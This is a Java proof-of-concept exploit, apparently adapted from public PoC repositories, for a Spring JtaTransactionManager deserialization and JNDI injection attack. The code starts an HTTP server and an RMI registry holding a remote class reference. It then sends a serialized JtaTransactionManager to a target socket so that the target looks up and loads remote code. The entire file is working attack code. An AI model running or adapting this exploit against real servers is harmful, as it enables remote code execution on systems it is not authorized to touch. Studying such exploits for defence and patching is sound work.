import java.io.*;
import java.net.*;
import java.rmi.registry.*;

import com.sun.net.httpserver.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;

//https://github.com/zerothoughts/spring-jndi
//https://github.com/imagemlt/JavaUnserializePocs

public class JDNI {

    public static void main(String[] args) {

        try {
            String serverAddress = "127.0.0.1";
            int port = Integer.parseInt( "1234" );
            String localAddress= "127.0.0.1";

            System.out.println("Starting HTTP server");
            HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0);
            httpServer.createContext("/",new HttpFileHandler());
            httpServer.setExecutor(null);
            httpServer.start();

            System.out.println("Creating RMI Registry");
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference reference = new javax.naming.Reference("ExportObject","ExportObject","http://"+serverAddress+":8000/");
            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
            registry.bind("Object", referenceWrapper);

            System.out.println("Connecting to server "+serverAddress+":"+port);
            Socket socket=new Socket(serverAddress,port);
            System.out.println("Connected to server");
            String jndiAddress = "rmi://"+localAddress+":1099/Object";

            org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
            object.setUserTransactionName(jndiAddress);

            //Object objectTest = new ExportObject();
            System.out.println("Sending object to server...");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
            objectOutputStream.writeObject(object);
            objectOutputStream.flush();
            while(true) {
                Thread.sleep(1000);
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
